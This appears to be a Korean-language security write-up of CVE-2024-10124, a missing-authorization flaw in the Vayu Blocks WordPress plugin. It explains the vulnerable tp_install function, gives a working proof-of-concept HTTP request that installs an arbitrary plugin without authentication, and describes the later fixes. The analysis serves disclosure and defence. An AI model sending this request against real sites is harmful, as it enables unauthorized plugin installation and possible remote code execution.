# CVE-2024-10124

## Index
* [📌 Analysis](#📌-analysis)
    * [1. 개요](#1-개요)
    * [2. 취약점 분석](#2-취약점-분석)
* [📌 PoC](#📌-poc)
* [📌 패치 확인](#📌-패치-확인)

## 📌 Analysis

### 1. 개요

`CVE-2024-10124` 취약점은 워드프레스 플러그인 ‘Vayu Blocks – Gutenberg Blocks for WordPress & WooCommerce(이하, Vayu Blocks)’ 의 버전 1.1.1 이하에서 인증되지 않은 사용자가 임의의 플러그인을 설치 및 활성화할 수 있는 취약점 입니다.

### 2. 취약점 분석

> ⚠️
> CVE-2024-10124의 경우 버전 1.1.1 이하에서 발생하는 취약점이라 명시되어 있지만, 인증되지 않은 사용자로 취약점을 재현 하려면 버전 1.1.0 이하에서 수행해야 합니다.
>

Vayu Blocks 플러그인의 대시보드 메뉴 'Vayu Sites'에서는 해당 플러그인을 사용하여 기본 템플릿을 지정할 수 있습니다.

![image](images/image-001.png)

템플릿은 아래와 같이 테마로 이루어진 워드프레스 사이트를 확인할 수 있으며,

![image](images/image-002.png)

원하는 템플릿을 선택한 뒤 하단의 CONTINUE 버튼을 클릭하면,

![image](images/image-003.png)

워드프레스 사이트에 템플릿 적용에 필요한 테마 및 플러그인이 설치된다는 확인 페이지가 나타납니다. 이어서 Build My Website 버튼을 클릭하면 설치가 진행됩니다.

![image](images/image-004.png)

설치가 시작될 때, HTTP 요청 패킷을 살펴보면 총 5개의 플러그인을 추가 설치하기 위한 데이터가 전송되는 것을 확인할 수 있습니다.

![image](images/image-005.png)

데이터를 살펴보면 `plugin`의 값은 설치할 플러그인의 slug와 플러그인 이름이 키-값 쌍으로 구성되어 있습니다(예: `"woocommerce": "Woocommerce"`). 이때 키에 해당하는 슬러그(`"woocommerce"`)는 `allPlugins`의 값에도 동일하게 존재하며, 여기서는 플러그인 설치를 위한 엔드포인트(`woocommerce/woocommerce.php`) 경로를 지정하고 있습니다.

위 요청은 Vayu Blocks 플러그인의 `wp-content/plugins/vayu-blocks/inc/vayu-sites/app.php` 파일내 `tp_install` 함수를 호출합니다.

![image](images/image-006.png)

이때, `tp_install` 함수를 호출한 사용자에 대한 접근 권한을 검사하지 않고 있습니다. 따라서 인증되지 않은 사용자가 `tp_instasll` 함수 호출을 위한 요청 패킷을 전달할 경우 임의의 플러그인을 설치 및 활성화 할 수 있는 취약점이 발생합니다.

이를 통해 인증되지 않은 공격자가 임의의 플러그인을 설치 및 활성화하여 다른 취약한 플러그인을 내려받아 원격 코드 실행을 수행할 수 있습니다.

## 📌 PoC

Vayu Blocks 플러그인 버전 1.1.0을 설치한 후 아래의 HTTP 패킷을 전송합니다. 이 패킷은 인증되지 않은 사용자가 대상 워드프레스 사이트에 Classic Editor 플러그인을 설치하도록 하는 요청입니다.

```plaintext
POST /wp-json/ai/v1/vayu-site-builder HTTP/1.1
Host: localhost:8080
Content-Type: application/json
Content-Length: 372

{
    "params": {
        "plugin": {
            "classic-editor": "Classic Editor"
        },
        "allPlugins": [
            {
                "classic-editor": "classic-editor/classic-editor.php"
            }
        ],
        "themeSlug": "",
        "proThemePlugin": "",
        "templateType": "free",
        "tmplFreePro": "plugin"
    }
}
```

위 요청 패킷을 보내면 서버로부터 정상적인 응답 메시지를 수신할 수 있으며,

![image](images/image-007.png)

워드프레스 사이트에 Classic Editor 플러그인이 설치 및 활성화된 것을 확인하실 수 있습니다.

![image](images/image-008.png)

## 📌 패치 확인

즉시 패치된 내용은 `current_user_can('manage_options')` 함수를 이용하여 관리자(Administrator) 역할을 가지는 사용자만이 `tp_install` 함수를 호출하도록 하고 있습니다.

> [https://plugins.trac.wordpress.org/changeset/3173408/vayu-blocks/trunk/inc/vayu-sites/app.php?old=3091496&old_path=vayu-blocks%2Ftrunk%2Finc%2Fvayu-sites%2Fapp.php](https://plugins.trac.wordpress.org/changeset/3173408/vayu-blocks/trunk/inc/vayu-sites/app.php?old=3091496&old_path=vayu-blocks%2Ftrunk%2Finc%2Fvayu-sites%2Fapp.php)
> 

![image](images/image-009.png)

이후 추가로 패치 된 내용으로는 CSRF 공격을 방어하기 위해 Nonce 값 검증을 수행하고 있습니다.

> [https://plugins.trac.wordpress.org/changeset/3203532/vayu-blocks/tags/1.2.0/inc/vayu-sites/app.php](https://plugins.trac.wordpress.org/changeset/3203532/vayu-blocks/tags/1.2.0/inc/vayu-sites/app.php)
> 

![image](images/image-010.png)